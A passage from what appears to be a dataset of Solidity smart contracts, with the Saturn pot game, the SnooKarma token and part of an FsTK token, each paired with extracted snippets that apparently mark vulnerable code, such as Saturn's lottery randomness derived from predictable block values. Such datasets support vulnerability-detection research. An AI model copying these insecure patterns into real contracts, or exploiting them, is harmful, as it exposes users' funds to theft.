  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function sqrt(uint256 x) internal pure returns (uint256 y) {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y) {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Saturn is Ownable {\n using SafeMath for uint256;\n struct Player {\n uint256 pid;\n uint256 ethTotal;\n uint256 ethBalance;\n uint256 ethWithdraw;\n uint256 ethShareWithdraw;\n uint256 tokenBalance;\n uint256 tokenDay;\n uint256 tokenDayBalance;\n }\n struct LuckyRecord {\n address player;\n uint256 amount;\n uint64 txId;\n uint64 time;\n uint64 level;\n }\n struct LuckyPending {\n address player;\n uint256 amount;\n uint64 txId;\n uint64 block;\n uint64 level;\n }\n struct InternalBuyEvent {\n uint256 flag1;\n }\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Buy(\n address indexed _token, address indexed _player, uint256 _amount, uint256 _total,\n uint256 _totalSupply, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot,\n uint256 _price, uint256 _flag1\n );\n event Withdraw(address indexed _token, address indexed _player, uint256 _amount);\n event Win(address indexed _token, address indexed _winner, uint256 _winAmount);\n string constant public name = \"Saturn\";\n string constant public symbol = \"SAT\";\n uint8 constant public decimals = 18;\n uint256 constant private FEE_REGISTER_ACCOUNT = 10 finney;\n uint256 constant private BUY_AMOUNT_MIN = 1000000000;\n uint256 constant private BUY_AMOUNT_MAX = 100000000000000000000000;\n uint256 constant private TIME_DURATION_INCREASE = 30 seconds;\n uint256 constant private TIME_DURATION_MAX = 24 hours;\n uint256 constant private ONE_TOKEN = 1000000000000000000;\n mapping(address => Player) public playerOf;\n mapping(uint256 => address) public playerIdOf;\n uint256 public playerCount;\n uint256 public totalSupply;\n uint256 public totalPot;\n uint256 public sharePot;\n uint256 public finalPot;\n uint256 public luckyPot;\n uint64 public txCount;\n uint256 public finishTime;\n uint256 public startTime;\n address public lastPlayer;\n address public winner;\n uint256 public winAmount;\n uint256 public price;\n address[3] public dealers;\n uint256 public dealerDay;\n LuckyPending[] public luckyPendings;\n uint256 public luckyPendingIndex;\n LuckyRecord[] public luckyRecords;\n address public feeOwner;\n uint256 public feeAmount;\n uint64[16] public feePrices = [uint64(88000000000000),140664279921934,224845905067685,359406674201608,574496375292119,918308169866219,1467876789325690,2346338995279770,3750523695724810,5995053579423660,9582839714125510,15317764181758900,24484798507285300,39137915352965200,62560303190573500,99999999999999100];\n uint8[16] public feePercents = [uint8(150),140,130,120,110,100,90,80,70,60,50,40,30,20,10,0];\n uint256 public feeIndex;\n constructor(uint256 _startTime, address _feeOwner) public {\n require(_startTime >= now && _feeOwner != address(0));\n startTime = _startTime;\n finishTime = _startTime + TIME_DURATION_MAX;\n totalSupply = 0;\n price = 88000000000000;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n modifier isActivated() {\n require(now >= startTime);\n _;\n }\n modifier isAccount() {\n address _address = msg.sender;\n uint256 _codeLength;\n assembly {_codeLength := extcodesize(_address)}\n require(_codeLength == 0 && tx.origin == msg.sender);\n _;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return playerOf[_owner].tokenBalance;\n }\n function getLuckyPendingSize() public view returns (uint256) {\n return luckyPendings.length;\n }\n function getLuckyRecordSize() public view returns (uint256) {\n return luckyRecords.length;\n }\n function getGameInfo() public view returns (\n uint256 _balance, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot, uint256 _rewardPot, uint256 _price,\n uint256 _totalSupply, uint256 _now, uint256 _timeLeft, address _winner, uint256 _winAmount, uint8 _feePercent\n ) {\n _balance = address(this).balance;\n _totalPot = totalPot;\n _sharePot = sharePot;\n _finalPot = finalPot;\n _luckyPot = luckyPot;\n _rewardPot = _sharePot;\n uint256 _withdraw = _sharePot.add(_finalPot).add(_luckyPot);\n if (_totalPot > _withdraw) {\n _rewardPot = _rewardPot.add(_totalPot.sub(_withdraw));\n }\n _price = price;\n _totalSupply = totalSupply;\n _now = now;\n _feePercent = feeIndex >= feePercents.length ? 0 : feePercents[feeIndex];\n if (now < finishTime) {\n _timeLeft = finishTime - now;\n } else {\n _timeLeft = 0;\n _winner = winner != address(0) ? winner : lastPlayer;\n _winAmount = winner != address(0) ? winAmount : finalPot;\n }\n }\n function getPlayerInfo(address _playerAddress) public view returns (\n uint256 _pid, uint256 _ethTotal, uint256 _ethBalance, uint256 _ethWithdraw,\n uint256 _tokenBalance, uint256 _tokenDayBalance\n ) {\n Player storage _player = playerOf[_playerAddress];\n if (_player.pid > 0) {\n _pid = _player.pid;\n _ethTotal = _player.ethTotal;\n uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);\n _ethBalance = _player.ethBalance;\n if (_sharePot > _player.ethShareWithdraw) {\n _ethBalance = _ethBalance.add(_sharePot.sub(_player.ethShareWithdraw));\n }\n _ethWithdraw = _player.ethWithdraw;\n _tokenBalance = _player.tokenBalance;\n uint256 _day = (now / 86400) * 86400;\n if (_player.tokenDay == _day) {\n _tokenDayBalance = _player.tokenDayBalance;\n }\n }\n }\n function getDealerAndLuckyInfo(uint256 _luckyOffset) public view returns (\n address[3] _dealerPlayers, uint256[3] _dealerDayTokens, uint256[3] _dealerTotalTokens,\n address[5] _luckyPlayers, uint256[5] _luckyAmounts, uint256[5] _luckyLevels, uint256[5] _luckyTimes\n ) {\n uint256 _day = (now / 86400) * 86400;\n if (dealerDay == _day) {\n for (uint256 _i = 0; _i < 3; ++_i) {\n if (dealers[_i] != address(0)) {\n Player storage _player = playerOf[dealers[_i]];\n _dealerPlayers[_i] = dealers[_i];\n _dealerDayTokens[_i] = _player.tokenDayBalance;\n _dealerTotalTokens[_i] = _player.tokenBalance;\n }\n }\n }\n uint256 _size = _luckyOffset >= luckyRecords.length ? 0 : luckyRecords.length - _luckyOffset;\n if (_luckyPlayers.length < _size) {\n _size = _luckyPlayers.length;\n }\n for (_i = 0; _i < _size; ++_i) {\n LuckyRecord memory _record = luckyRecords[luckyRecords.length - _luckyOffset - 1 - _i];\n _luckyPlayers[_i] = _record.player;\n _luckyAmounts[_i] = _record.amount;\n _luckyLevels[_i] = _record.level;\n _luckyTimes[_i] = _record.time;\n }\n }\n function transfer(address _to, uint256 _value) isActivated isAccount public returns (bool) {\n require(_to == address(this));\n Player storage _player = playerOf[msg.sender];\n require(_player.pid > 0);\n if (now >= finishTime) {\n if (winner == address(0)) {\n endGame();\n }\n _value = 80000000000000000;\n } else {\n require(_value == 80000000000000000 || _value == 10000000000000000);\n }\n uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);\n uint256 _eth = 0;\n if (_sharePot > _player.ethShareWithdraw) {\n _eth = _sharePot.sub(_player.ethShareWithdraw);\n _player.ethShareWithdraw = _sharePot;\n }\n _eth = _eth.add(_player.ethBalance);\n _player.ethBalance = 0;\n _player.ethWithdraw = _player.ethWithdraw.add(_eth);\n if (_value == 80000000000000000) {\n uint256 _fee = _eth.mul(feeIndex >= feePercents.length ? 0 : feePercents[feeIndex]).div(1000);\n if (_fee > 0) {\n feeAmount = feeAmount.add(_fee);\n _eth = _eth.sub(_fee);\n }\n sendFeeIfAvailable();\n msg.sender.transfer(_eth);\n emit Withdraw(_to, msg.sender, _eth);\n emit Transfer(msg.sender, _to, 0);\n } else {\n InternalBuyEvent memory _buyEvent = InternalBuyEvent({\n flag1: 0\n });\n buy(_player, _buyEvent, _eth);\n }\n return true;\n }\n function() isActivated isAccount payable public {\n uint256 _eth = msg.value;\n require(now < finishTime);\n InternalBuyEvent memory _buyEvent = InternalBuyEvent({\n flag1: 0\n });\n Player storage _player = playerOf[msg.sender];\n if (_player.pid == 0) {\n require(_eth >= FEE_REGISTER_ACCOUNT);\n uint256 _fee = FEE_REGISTER_ACCOUNT.sub(BUY_AMOUNT_MIN);\n _eth = _eth.sub(_fee);\n feeAmount = feeAmount.add(_fee);\n playerCount = playerCount.add(1);\n Player memory _p = Player({\n pid: playerCount,\n ethTotal: 0,\n ethBalance: 0,\n ethWithdraw: 0,\n ethShareWithdraw: 0,\n tokenBalance: 0,\n tokenDay: 0,\n tokenDayBalance: 0\n });\n playerOf[msg.sender] = _p;\n playerIdOf[_p.pid] = msg.sender;\n _player = playerOf[msg.sender];\n _buyEvent.flag1 += 1;\n }\n buy(_player, _buyEvent, _eth);\n }\n function buy(Player storage _player, InternalBuyEvent memory _buyEvent, uint256 _amount) private {\n require(now < finishTime && _amount >= BUY_AMOUNT_MIN && _amount <= BUY_AMOUNT_MAX);\n uint256 _day = (now / 86400) * 86400;\n uint256 _backEth = 0;\n uint256 _eth = _amount;\n if (totalPot < 200000000000000000000) {\n if (_eth >= 5000000000000000000) {\n _backEth = _eth.sub(5000000000000000000);\n _eth = 5000000000000000000;\n }\n }\n txCount = txCount + 1;\n _buyEvent.flag1 += txCount * 10;\n _player.ethTotal = _player.ethTotal.add(_eth);\n totalPot = totalPot.add(_eth);\n uint256 _newTotalSupply = calculateTotalSupply(totalPot);\n uint256 _tokenAmount = _newTotalSupply.sub(totalSupply);\n _player.tokenBalance = _player.tokenBalance.add(_tokenAmount);\n if (_player.tokenDay == _day) {\n _player.tokenDayBalance = _player.tokenDayBalance.add(_tokenAmount);\n } else {\n _player.tokenDay = _day;\n _player.tokenDayBalance = _tokenAmount;\n }\n updatePrice(_newTotalSupply);\n handlePot(_day, _eth, _newTotalSupply, _tokenAmount, _player, _buyEvent);\n if (_backEth > 0) {\n _player.ethBalance = _player.ethBalance.add(_backEth);\n }\n sendFeeIfAvailable();\n emitEndTxEvents(_eth, _tokenAmount, _buyEvent);\n }\n function handlePot(uint256 _day, uint256 _eth, uint256 _newTotalSupply, uint256 _tokenAmount, Player storage _player, InternalBuyEvent memory _buyEvent) private {\n uint256 _sharePotDelta = _eth.div(2);\n uint256 _finalPotDelta = _eth.div(5);\n uint256 _luckyPotDelta = _eth.mul(255).div(1000);\n uint256 _dealerPotDelta = _eth.sub(_sharePotDelta).sub(_finalPotDelta).sub(_luckyPotDelta);\n sharePot = sharePot.add(_sharePotDelta);\n finalPot = finalPot.add(_finalPotDelta);\n luckyPot = luckyPot.add(_luckyPotDelta);\n totalSupply = _newTotalSupply;\n handleDealerPot(_day, _dealerPotDelta, _player, _buyEvent);\n handleLuckyPot(_eth, _player);\n if (_tokenAmount >= ONE_TOKEN) {\n updateFinishTime(_tokenAmount);\n lastPlayer = msg.sender;\n }\n _buyEvent.flag1 += finishTime * 1000000000000000000000;\n }\n function handleLuckyPot(uint256 _eth, Player storage _player) private {\n uint256 _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n _seed = _seed - ((_seed / 1000) * 1000);\n uint64 _level = 0;\n if (_seed < 227) {\n _level = 1;\n } else if (_seed < 422) {\n _level = 2;\n } else if (_seed < 519) {\n _level = 3;\n } else if (_seed < 600) {\n _level = 4;\n } else if (_seed < 700) {\n _level = 5;\n } else {\n _level = 6;\n }\n if (_level >= 5) {\n handleLuckyReward(txCount, _level, _eth, _player);\n } else {\n LuckyPending memory _pending = LuckyPending({\n player: msg.sender,\n amount: _eth,\n txId: txCount,\n block: uint64(block.number + 1),\n level: _level\n });\n luckyPendings.push(_pending);\n }\n handleLuckyPending(_level >= 5 ? 0 : 1);\n }\n function handleLuckyPending(uint256 _pendingSkipSize) private {\n if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n LuckyPending storage _pending = luckyPendings[luckyPendingIndex];\n if (_pending.block <= block.number) {\n uint256 _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n (block.number)\n )));\n _seed = _seed - ((_seed / 1000) * 1000);\n handleLucyPendingForOne(_pending, _seed);\n if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n _pending = luckyPendings[luckyPendingIndex];\n if (_pending.block <= block.number) {\n handleLucyPendingForOne(_pending, _seed);\n }\n }\n }\n }\n }\n function handleLucyPendingForOne(LuckyPending storage _pending, uint256 _seed) private {\n luckyPendingIndex = luckyPendingIndex.add(1);\n bool _reward = false;\n if (_pending.level == 4) {\n _reward = _seed < 617;\n } else if (_pending.level == 3) {\n _reward = _seed < 309;\n } else if (_pending.level == 2) {\n _reward = _seed < 102;\n } else if (_pending.level == 1) {\n _reward = _seed < 44;\n }\n if (_reward) {\n handleLuckyReward(_pending.txId, _pending.level, _pending.amount, playerOf[_pending.player]);\n }\n }\n function handleLuckyReward(uint64 _txId, uint64 _level, uint256 _eth, Player storage _player) private {\n uint256 _amount;\n if (_level == 1) {\n _amount = _eth.mul(7);\n } else if (_level == 2) {\n _amount = _eth.mul(3);\n } else if (_level == 3) {\n _amount = _eth;\n } else if (_level == 4) {\n _amount = _eth.div(2);\n } else if (_level == 5) {\n _amount = _eth.div(5);\n } else if (_level == 6) {\n _amount = _eth.div(10);\n }\n uint256 _maxPot = luckyPot.div(2);\n if (_amount > _maxPot) {\n _amount = _maxPot;\n }\n luckyPot = luckyPot.sub(_amount);\n _player.ethBalance = _player.ethBalance.add(_amount);\n LuckyRecord memory _record = LuckyRecord({\n player: msg.sender,\n amount: _amount,\n txId: _txId,\n level: _level,\n time: uint64(now)\n });\n luckyRecords.push(_record);\n }\n function handleDealerPot(uint256 _day, uint256 _dealerPotDelta, Player storage _player, InternalBuyEvent memory _buyEvent) private {\n uint256 _potUnit = _dealerPotDelta.div(dealers.length);\n if (dealerDay != _day || dealers[0] == address(0)) {\n dealerDay = _day;\n dealers[0] = msg.sender;\n dealers[1] = address(0);\n dealers[2] = address(0);\n _player.ethBalance = _player.ethBalance.add(_potUnit);\n feeAmount = feeAmount.add(_dealerPotDelta.sub(_potUnit));\n _buyEvent.flag1 += _player.pid * 100000000000000000000000000000000;\n return;\n }\n for (uint256 _i = 0; _i < dealers.length; ++_i) {\n if (dealers[_i] == address(0)) {\n dealers[_i] = msg.sender;\n break;\n }\n if (dealers[_i] == msg.sender) {\n break;\n }\n Player storage _dealer = playerOf[dealers[_i]];\n if (_dealer.tokenDayBalance < _player.tokenDayBalance) {\n for (uint256 _j = dealers.length - 1; _j > _i; --_j) {\n if (dealers[_j - 1] != msg.sender) {\n dealers[_j] = dealers[_j - 1];\n }\n }\n dealers[_i] = msg.sender;\n break;\n }\n }\n uint256 _fee = _dealerPotDelta;\n for (_i = 0; _i < dealers.length; ++_i) {\n if (dealers[_i] == address(0)) {\n break;\n }\n _dealer = playerOf[dealers[_i]];\n _dealer.ethBalance = _dealer.ethBalance.add(_potUnit);\n _fee = _fee.sub(_potUnit);\n _buyEvent.flag1 += _dealer.pid *\n (_i == 0 ? 100000000000000000000000000000000 :\n (_i == 1 ? 100000000000000000000000000000000000000000000000 :\n (_i == 2 ? 100000000000000000000000000000000000000000000000000000000000000 : 0)));\n }\n if (_fee > 0) {\n feeAmount = feeAmount.add(_fee);\n }\n }\n function emitEndTxEvents(uint256 _eth, uint256 _tokenAmount, InternalBuyEvent memory _buyEvent) private {\n emit Transfer(address(this), msg.sender, _tokenAmount);\n emit Buy(\n address(this), msg.sender, _eth, _tokenAmount,\n totalSupply, totalPot, sharePot, finalPot, luckyPot,\n price, _buyEvent.flag1\n );\n }\n function endGame() private {\n if (luckyPot > 0) {\n feeAmount = feeAmount.add(luckyPot);\n luckyPot = 0;\n }\n if (winner == address(0) && lastPlayer != address(0)) {\n winner = lastPlayer;\n lastPlayer = address(0);\n winAmount = finalPot;\n finalPot = 0;\n Player storage _player = playerOf[winner];\n _player.ethBalance = _player.ethBalance.add(winAmount);\n emit Win(address(this), winner, winAmount);\n }\n }\n function updateFinishTime(uint256 _tokenAmount) private {\n uint256 _timeDelta = _tokenAmount.div(ONE_TOKEN).mul(TIME_DURATION_INCREASE);\n uint256 _finishTime = finishTime.add(_timeDelta);\n uint256 _maxTime = now.add(TIME_DURATION_MAX);\n finishTime = _finishTime <= _maxTime ? _finishTime : _maxTime;\n }\n function updatePrice(uint256 _newTotalSupply) private {\n price = _newTotalSupply.mul(2).div(10000000000).add(88000000000000);\n uint256 _idx = feeIndex + 1;\n while (_idx < feePrices.length && price >= feePrices[_idx]) {\n feeIndex = _idx;\n ++_idx;\n }\n }\n function calculateTotalSupply(uint256 _newTotalPot) private pure returns(uint256) {\n return _newTotalPot.mul(10000000000000000000000000000)\n .add(193600000000000000000000000000000000000000000000)\n .sqrt()\n .sub(440000000000000000000000);\n }\n function sendFeeIfAvailable() private {\n if (feeAmount > 1000000000000000000) {\n feeOwner.transfer(feeAmount);\n feeAmount = 0;\n }\n }\n function changeFeeOwner(address _feeOwner) onlyOwner public {\n require(_feeOwner != feeOwner && _feeOwner != address(0));\n feeOwner = _feeOwner;\n }\n function withdrawFee(uint256 _amount) onlyOwner public {\n require(now >= finishTime.add(30 days));\n if (winner == address(0)) {\n endGame();\n }\n feeAmount = feeAmount > _amount ? feeAmount.sub(_amount) : 0;\n feeOwner.transfer(_amount);\n }\n}",
  "extract_feature": [
    "function handleLuckyPot(uint256 _eth, Player storage _player) private {\nuint256 _seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\n_seed = _seed - ((_seed / 1000) * 1000);\nuint64 _level = 0;\nif (_seed < 227) {\n_level = 1;\n} else if (_seed < 422) {\n_level = 2;\n} else if (_seed < 519) {\n_level = 3;\n} else if (_seed < 600) {\n_level = 4;\n} else if (_seed < 700) {\n_level = 5;\n} else {\n_level = 6;\n}\nif (_level >= 5) {\nhandleLuckyReward(txCount, _level, _eth, _player);\n} else {\nLuckyPending memory _pending = LuckyPending({\nplayer: msg.sender,\namount: _eth,\ntxId: txCount,\nblock: uint64(block.number + 1),\nlevel: _level\n});\nluckyPendings.push(_pending);\n}\nhandleLuckyPending(_level >= 5 ? 0 : 1);\n}",
    "function handleLuckyPending(uint256 _pendingSkipSize) private {\nif (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\nLuckyPending storage _pending = luckyPendings[luckyPendingIndex];\nif (_pending.block <= block.number) {\nuint256 _seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n(block.number)\n)));\n_seed = _seed - ((_seed / 1000) * 1000);\nhandleLucyPendingForOne(_pending, _seed);\nif (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n_pending = luckyPendings[luckyPendingIndex];\nif (_pending.block <= block.number) {\nhandleLucyPendingForOne(_pending, _seed);\n}\n}\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f00"
  },
  "filename": "419.sol",
  "content": "pragma solidity 0.4.24;\ncontract SnooKarma {\n address public oracle;\n address public maintainer;\n address public owner;\n mapping(address => uint) public balanceOf;\n mapping(address => mapping (address => uint)) public allowance;\n string public constant symbol = \"SNK\";\n string public constant name = \"SnooKarma\";\n uint8 public constant decimals = 2;\n uint public totalSupply = 0;\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n event Redeem(string indexed username, address indexed addr, uint karma);\n mapping(string => uint) redeemedKarma;\n constructor() public {\n owner = msg.sender;\n maintainer = msg.sender;\n oracle = msg.sender;\n }\n function transfer(address destination, uint amount) public returns (bool success) {\n if (balanceOf[msg.sender] >= amount &&\n balanceOf[destination] + amount > balanceOf[destination]) {\n balanceOf[msg.sender] -= amount;\n balanceOf[destination] += amount;\n emit Transfer(msg.sender, destination, amount);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom (\n address from,\n address to,\n uint amount\n ) public returns (bool success) {\n if (balanceOf[from] >= amount &&\n allowance[from][msg.sender] >= amount &&\n balanceOf[to] + amount > balanceOf[to])\n {\n balanceOf[from] -= amount;\n allowance[from][msg.sender] -= amount;\n balanceOf[to] += amount;\n emit Transfer(from, to, amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint amount) public returns (bool success) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n function safeAdd(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n require(c >= a);\n return c;\n }\n modifier onlyBy(address account) {\n require(msg.sender == account);\n _;\n }\n function transferOwnership(address newOwner) public onlyBy(owner) {\n require(newOwner != address(0));\n owner = newOwner;\n }\n function changeOracle(address newOracle) public onlyBy(owner) {\n require(oracle != address(0) && newOracle != address(0));\n oracle = newOracle;\n }\n function removeOracle() public onlyBy(owner) {\n oracle = address(0);\n }\n function changeMaintainer(address newMaintainer) public onlyBy(owner) {\n maintainer = newMaintainer;\n }\n function redeem(string username, uint karma, uint sigExp, uint8 sigV, bytes32 sigR, bytes32 sigS) public {\n require(\n ecrecover(\n keccak256(abi.encodePacked(this, username, karma, sigExp)),\n sigV, sigR, sigS\n ) == oracle\n );\n require(block.timestamp < sigExp);\n require(karma > redeemedKarma[username]);\n uint newUserKarma = karma - redeemedKarma[username];\n balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], newUserKarma);\n uint newMaintainerKarma = newUserKarma / 100;\n balanceOf[maintainer] = safeAdd(balanceOf[maintainer], newMaintainerKarma);\n totalSupply = safeAdd(totalSupply, safeAdd(newUserKarma, newMaintainerKarma));\n redeemedKarma[username] = karma;\n emit Redeem(username, msg.sender, newUserKarma);\n emit Transfer(0x0, msg.sender, newUserKarma);\n }\n function redeemedKarmaOf(string username) public view returns(uint) {\n return redeemedKarma[username];\n }\n function() public payable { }\n function transferEthereum(uint amount, address destination) public onlyBy(maintainer) {\n require(destination != address(0));\n destination.transfer(amount);\n }\n function transferTokens(address token, uint amount, address destination) public onlyBy(maintainer) {\n require(destination != address(0));\n SnooKarma tokenContract = SnooKarma(token);\n tokenContract.transfer(destination, amount);\n }\n}",
  "extract_feature": [
    "function redeem(string username, uint karma, uint sigExp, uint8 sigV, bytes32 sigR, bytes32 sigS) public {\nrequire(\necrecover(\nkeccak256(abi.encodePacked(this, username, karma, sigExp)),\nsigV, sigR, sigS\n) == oracle\n);\nrequire(block.timestamp < sigExp);\nrequire(karma > redeemedKarma[username]);\nuint newUserKarma = karma - redeemedKarma[username];\nbalanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], newUserKarma);\nuint newMaintainerKarma = newUserKarma / 100;\nbalanceOf[maintainer] = safeAdd(balanceOf[maintainer], newMaintainerKarma);\ntotalSupply = safeAdd(totalSupply, safeAdd(newUserKarma, newMaintainerKarma));\nredeemedKarma[username] = karma;\nemit Redeem(username, msg.sender, newUserKarma);\nemit Transfer(0x0, msg.sender, newUserKarma);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f01"
  },
  "filename": "578.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary AddressExtension {\n function isValid(address _address) internal pure returns (bool) {\n return 0 != _address;\n }\n function isAccount(address _address) internal view returns (bool result) {\n assembly {\n result := iszero(extcodesize(_address))\n }\n }\n function toBytes(address _address) internal pure returns (bytes b) {\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address))\n mstore(0x40, add(m, 52))\n b := m\n }\n }\n}\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKAuthority {\n function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);\n function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);\n function validate() public pure returns (bytes4);\n}\ncontract Authorizable {\n event SetFsTKAuthority(FsTKAuthority indexed _address);\n modifier onlyFsTKAuthorized {\n require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));\n _;\n }\n modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {\n require(fstkAuthority.isApproved(hash, approveTime, approveToken));\n _;\n }\n FsTKAuthority internal fstkAuthority;\n constructor(FsTKAuthority _fstkAuthority) internal {\n fstkAuthority = _fstkAuthority;\n }\n function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {\n require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);\n emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);\n }\n}\ncontract IssuerContract {\n using AddressExtension for address;\n event SetIssuer(address indexed _address);\n modifier onlyIssuer {\n require(issuer == msg.sender);\n _;\n }\n address public issuer;\n address public newIssuer;\n constructor(address _issuer) internal {\n issuer = _issuer;\n }\n function setIssuer(address _address) public onlyIssuer {\n newIssuer = _address;\n }\n function confirmSetIssuer() public {\n require(newIssuer == msg.sender);\n emit SetIssuer(issuer = newIssuer);\n delete newIssuer;\n }\n}\ncontract ERC20 {\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public view returns (uint256);\n function allowance(address owner, address spender) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n}\ncontract SecureERC20 is ERC20 {\n event SetERC20ApproveChecking(bool approveChecking);\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);\n function increaseAllowance(address spender, uint256 value) public returns (bool);\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);\n function setERC20ApproveChecking(bool approveChecking) public;\n}\ncontract FsTKToken {\n enum DelegateMode { PublicMsgSender, PublicTxOrigin, PrivateMsgSender, PrivateTxOrigin }\n event Consume(address indexed from, uint256 value, bytes32 challenge);\n event IncreaseNonce(address indexed from, uint256 nonce);\n event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);\n event TerminateDirectDebit(address indexed debtor, address indexed receiver);\n event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);\n event SetMetadata(string metadata);\n event SetLiquid(bool liquidity);\n event SetDelegate(bool isDelegateEnable);\n event SetDirectDebit(bool isDirectDebitEnable);\n struct DirectDebitInfo {\n uint256 amount;\n uint256 startTime;\n uint256 interval;\n }\n struct DirectDebit {\n DirectDebitInfo info;\n uint256 epoch;\n }\n struct Instrument {\n uint256 allowance;\n DirectDebit directDebit;\n }\n struct Account {\n uint256 balance;\n uint256 nonce;\n mapping (address => Instrument) instruments;\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256);\n function transfer(uint256[] data) public returns (bool);\n function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);\n function nonceOf(address owner) public view returns (uint256);\n function increaseNonce() public returns (bool);\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n uint256 gasAmount,\n address 